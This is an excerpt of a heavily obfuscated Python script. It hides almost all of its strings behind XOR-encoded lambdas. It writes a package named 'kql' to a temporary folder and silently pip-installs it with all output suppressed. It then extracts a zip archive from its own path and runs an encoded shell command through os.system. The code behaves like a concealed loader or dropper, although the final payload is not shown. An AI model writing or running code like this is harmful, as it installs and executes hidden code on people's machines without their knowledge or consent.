K = (lambda x, y: ''.join(chr(q ^ x) for q in y))(142, [229, 255, 226])
G = (lambda x, y: ''.join(chr(q ^ x) for q in y))(229, [146])
F = open
import platform as L, sys as D, tempfile as M, shutil as N, os as E, zipfile as J
H = print
A = (lambda x, y: ''.join(chr(q ^ x) for q in y))(145, [])
B = chr
import os as C, subprocess as O, sys, tempfile as P, importlib.util
I = K
Q = (lambda x, y: ''.join(chr(q ^ x) for q in y))(152, [243, 233, 244, 253,
    255, 255])
R = (lambda x, y: ''.join(chr(q ^ x) for q in y))(149, [243, 231, 250, 248,
...
S = (lambda x, y: ''.join(chr(q ^ x) for q in y))(97, [8, 12, 17, 14, 19, 
    21, 65, 18, 24, 18, 107, 8, 12, 17, 14, 19, 21, 65, 14, 18, 107, 8, 12,
    17, 14, 19, 21, 65, 19, 4, 107, 8, 12, 17, 14, 19, 21, 65, 19, 4, 16, 
    20, 4, 18, 21, 18, 107, 8, 12, 17, 14, 19, 21, 65, 20, 19, 13, 13, 8, 3,
    79, 17, 0, 19, 18, 4, 107, 8, 12, 17, 14, 19, 21, 65, 22, 4, 3, 3, 19, 
    14, 22, 18, 4, 19, 107, 8, 12, 17, 14, 19, 21, 65, 3, 20, 8, 13, 21, 8,
    15, 18, 107, 8, 12, 17, 14, 19, 21, 65, 21, 19, 0, 2, 4, 3, 0, 2, 10, 
    107, 8, 12, 17, 14, 19, 21, 65, 18, 8, 6, 15, 0, 13, 107, 8, 12, 17, 14,
    19, 21, 65, 0, 21, 4, 25, 8, 21, 107, 107, 66, 65, 76, 76, 65, 39, 14, 
    19, 2, 4, 65, 3, 0, 15, 15, 4, 19, 65, 17, 19, 8, 15, 21, 65, 0, 13, 22,
    0, 24, 18, 107, 5, 4, 7, 65, 7, 14, 19, 2, 4, 62, 17, 19, 8, 15, 21, 62,
    3, 0, 15, 15, 4, 19, 73, 72, 91, 107, 65, 65, 65, 65, 21, 19, 24, 91, 
    107, 65, 65, 65, 65, 65, 65, 65, 65, 18, 24, 18, 79, 62, 62, 18, 21, 5,
    14, 20, 21, 62, 62, 79, 22, 19, 8, 21, 4, 73, 70, 37, 36, 34, 46, 37, 
    36, 65, 35, 56, 65, 50, 53, 36, 40, 47, 65, 29, 65, 33, 51, 36, 43, 36,
    51, 42, 61, 15, 70, 72, 107, 65, 65, 65, 65, 4, 25, 2, 4, 17, 21, 65, 
    36, 25, 2, 4, 17, 21, 8, 14, 15, 91, 107, 65, 65, 65, 65, 65, 65, 65, 
    65, 17, 19, 8, 15, 21, 73, 70, 37, 36, 34, 46, 37, 36, 65, 35, 56, 65, 
    50, 53, 36, 40, 47, 65, 29, 65, 33, 51, 36, 43, 36, 51, 42, 70, 72, 107,
...
T = (lambda x, y: ''.join(chr(q ^ x) for q in y))(75, [45, 57, 36, 38, 107,
    56, 46, 63, 62, 59, 63, 36, 36, 39, 56, 107, 34, 38, 59, 36, 57, 63, 
    107, 56, 46, 63, 62, 59, 103, 107, 45, 34, 37, 47, 20, 59, 42, 40, 32, 
    42, 44, 46, 56, 65, 65, 56, 46, 63, 62, 59, 99, 65, 107, 107, 107, 107,
    37, 42, 38, 46, 118, 105, 32, 58, 39, 105, 103, 65, 107, 107, 107, 107,
    61, 46, 57, 56, 34, 36, 37, 118, 105, 122, 101, 121, 101, 122, 121, 105,
...
U = (lambda x, y: ''.join(chr(q ^ x) for q in y))(1, [34, 33, 106, 112, 109,
...
def V(temp_dir):
    D = (lambda x, y: ''.join(chr(q ^ x) for q in y))(7, [114, 115, 97, 42, 63]
        )
    B = temp_dir
    ...
    with F(C.path.join(B, I, (lambda x, y: ''.join(chr(q ^ x) for q in y))(
        50, [109, 109, 91, 92, 91, 70, 109, 109, 28, 66, 75])), G, encoding=D
        ) as A:
        A.write(R)
    with F(C.path.join(B, I, (lambda x, y: ''.join(chr(q ^ x) for q in y))(
        44, [95, 88, 73, 69, 66, 2, 92, 85])), G, encoding=D) as A:
        A.write(S)
    with F(C.path.join(B, (lambda x, y: ''.join(chr(q ^ x) for q in y))(32,
        [83, 69, 84, 85, 80, 14, 80, 89])), G, encoding=D) as A:
        A.write(T)
    with F(C.path.join(B, (lambda x, y: ''.join(chr(q ^ x) for q in y))(110,
        [60, 43, 47, 42, 35, 43, 64, 3, 10])), G, encoding=D) as A:
        A.write(U)
...
def W(temp_dir):
    with F(C.devnull, G) as A:
        O.run([sys.executable, (lambda x, y: ''.join(chr(q ^ x) for q in y)
            )(110, [67, 3]), (lambda x, y: ''.join(chr(q ^ x) for q in y))(
            160, [208, 201, 208]), (lambda x, y: ''.join(chr(q ^ x) for q in
            y))(26, [115, 116, 105, 110, 123, 118, 118]), temp_dir], stdout
            =A, stderr=A)
...
if __name__ == (lambda x, y: ''.join(chr(q ^ x) for q in y))(13, [82, 82, 
    96, 108, 100, 99, 82, 82]):
    Y()


def Z():
    K = E.path.dirname(E.path.abspath(D.argv[0]))
    F = M.mkdtemp()
    try:
        O = E.path.abspath(D.argv[0])
        with J.ZipFile(O, (lambda x, y: ''.join(chr(q ^ x) for q in y))(34,
            [80])) as P:
            P.extractall(F)
        C = L.machine()
        ...
        R = (lambda s: A.join(B(A ^ 128) for A in s))([229, 248, 240, 239, 
            ...
            165, 243]) % (D.prefix, D.prefix, D.executable, G, (lambda x, y:
            ''.join(chr(q ^ x) for q in y))(33, [1]).join(D.argv[1:]))
        E.system(R)
    except J.BadZipFile:
